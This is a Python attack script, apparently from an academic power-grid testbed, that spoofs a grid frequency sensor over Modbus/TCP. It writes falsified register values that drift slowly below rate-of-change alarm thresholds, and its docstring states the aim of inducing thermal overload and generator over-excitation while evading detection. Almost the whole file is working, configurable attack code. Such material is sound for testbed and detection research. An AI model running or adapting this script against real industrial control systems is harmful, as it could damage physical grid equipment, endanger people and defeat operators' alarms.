"""
attacks/slow_drift.py — Stealthy Slow-Drift Frequency Spoofing Attack

Mechanism
---------
Runs a standard Modbus/TCP client from the attacker host and issues
WRITE_SINGLE_REGISTER (FC 6) requests to HR 0, gradually decrementing
the reported frequency from nominal (50.00 Hz) down to target (e.g. 48.50 Hz)
at a slow, continuous drift rate (e.g. 0.05 Hz/s).

Academic framing (for writeup)
-------------------------------
Unlike abrupt value spoofing (spoof.py) which introduces an instantaneous
1.50 Hz step jump that easily triggers sudden-change and RoCoF (Rate of Change
of Frequency) threshold alarms, the Slow-Drift attack is specifically crafted
to stay below standard RoCoF thresholds (e.g. < 0.50 Hz/s).

This models a stealthy cyber-physical attacker aiming to induce slow thermal
overload and generator over-excitation while evading simple rule-based and
signal-gradient detection mechanisms (NISTIR 7628 / IEC 62351 stealth attack threat).

Usage (from attacker host or standalone):
    python attacks/slow_drift.py \\
        --sensor-ip      192.168.1.10 \\
        --target-freq    48.50 \\
        --drift-rate     0.05 \\
        --attack-start   60.0 \\
        --attack-duration 120.0 \\
        [--db-path powergrid_db.sqlite]
"""

import sys
import os
import time
import argparse
import sqlite3

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

MODBUS_PORT = 502
FREQ_REGISTER = 0
NOMINAL_FREQ = 50.00


def _set_attack_flag(db_path: str, value: str) -> None:
    """Write ATTACK_ACTIVE tag to shared SQLite state DB."""
    try:
        conn = sqlite3.connect(db_path, timeout=5)
        conn.execute(
            "UPDATE powergrid SET value=? WHERE name='ATTACK_ACTIVE' AND pid=1",
            (value,)
        )
        conn.commit()
        conn.close()
    except Exception as exc:
        print(f"[slow_drift] WARNING: could not update ATTACK_ACTIVE flag: {exc}", file=sys.stderr)


def run_slow_drift(
    sensor_ip: str,
    target_freq: float,
    drift_rate: float,
    attack_start: float,
    attack_duration: float,
    db_path: str,
    scale_factor: float,
    period: float,
) -> None:
    """Main entry point: pre-wait -> connect -> gradual ramp down -> cleanup."""
    attack_end = attack_start + attack_duration

    print(f"[slow_drift] ── Configuration ─────────────────────────────────────")
    print(f"[slow_drift]   Target sensor : {sensor_ip}:{MODBUS_PORT}")
    print(f"[slow_drift]   Nominal freq  : {NOMINAL_FREQ:.2f} Hz")
    print(f"[slow_drift]   Target freq   : {target_freq:.2f} Hz")
    print(f"[slow_drift]   Drift rate    : {drift_rate:.3f} Hz/s  (RoCoF below alarm threshold)")
    print(f"[slow_drift]   Attack window : t={attack_start:.1f}s → t={attack_end:.1f}s (duration {attack_duration:.0f}s)")
    print(f"[slow_drift]   Write period  : {period:.3f}s")
    print(f"[slow_drift]   State DB      : {db_path}")
    print(f"[slow_drift] ─────────────────────────────────────────────────────")

    # 1. Pre-attack wait
    t0 = time.monotonic()
    wait = attack_start - (time.monotonic() - t0)
    if wait > 0:
        print(f"[slow_drift] Waiting {wait:.1f}s before slow-drift attack window opens...")
        time.sleep(wait)

    # 2. Connect Modbus Client
    client = ModbusTcpClient(host=sensor_ip, port=MODBUS_PORT)
    if not client.connect():
        print(f"[slow_drift] ERROR: Modbus connection to {sensor_ip}:{MODBUS_PORT} failed.", file=sys.stderr)
        sys.exit(1)
    print(f"[slow_drift] Connected to Modbus server at {sensor_ip}:{MODBUS_PORT}.")
    print(f"[slow_drift] Beginning slow-drift ramp injection...")

    # 3. Active attack loop
    _set_attack_flag(db_path, '1')
    print(f"[slow_drift] ATTACK_ACTIVE = True  ← attack window open")

    window_start = time.monotonic()
    writes_ok = 0
    writes_fail = 0

    try:
        while (time.monotonic() - window_start) < attack_duration:
            loop_t = time.monotonic()
            elapsed_attack = loop_t - window_start

            # Calculate gradually drifting frequency
            current_drift_freq = max(target_freq, NOMINAL_FREQ - (drift_rate * elapsed_attack))
            scaled_val = int(round(current_drift_freq * scale_factor))

            try:
                rr = client.write_register(FREQ_REGISTER, scaled_val)
                if rr and hasattr(rr, 'isError') and rr.isError():
                    writes_fail += 1
                else:
                    writes_ok += 1
            except Exception as exc:
                writes_fail += 1

            sleep_t = period - (time.monotonic() - loop_t)
            if sleep_t > 0:
                time.sleep(sleep_t)

    finally:
        client.close()
        _set_attack_flag(db_path, '0')
        print(f"[slow_drift] ATTACK_ACTIVE = False ← attack window closed")
        print(f"[slow_drift] Stats: {writes_ok} successful writes, {writes_fail} failed writes")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus Slow-Drift Frequency Spoofing Attack — Power Grid CPS Phase 4',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--sensor-ip', default='192.168.1.10', help='Sensor Modbus server IP')
    parser.add_argument('--target-freq', type=float, default=48.50, help='Final target frequency (Hz)')
    parser.add_argument('--drift-rate', type=float, default=0.05, help='Frequency drift rate (Hz/s)')
    parser.add_argument('--attack-start', type=float, default=60.0, help='Seconds after launch to start drift (s)')
    parser.add_argument('--attack-duration', type=float, default=120.0, help='Duration of drift window (s)')
    parser.add_argument('--db-path', default='powergrid_db.sqlite', help='State DB path')
    parser.add_argument('--scale-factor', type=float, default=100.0, help='Modbus scale factor')
    parser.add_argument('--period', type=float, default=0.1, help='Write interval (s)')
    args = parser.parse_args()

    run_slow_drift(
        sensor_ip=args.sensor_ip,
        target_freq=args.target_freq,
        drift_rate=args.drift_rate,
        attack_start=args.attack_start,
        attack_duration=args.attack_duration,
        db_path=args.db_path,
        scale_factor=args.scale_factor,
        period=args.period
    )
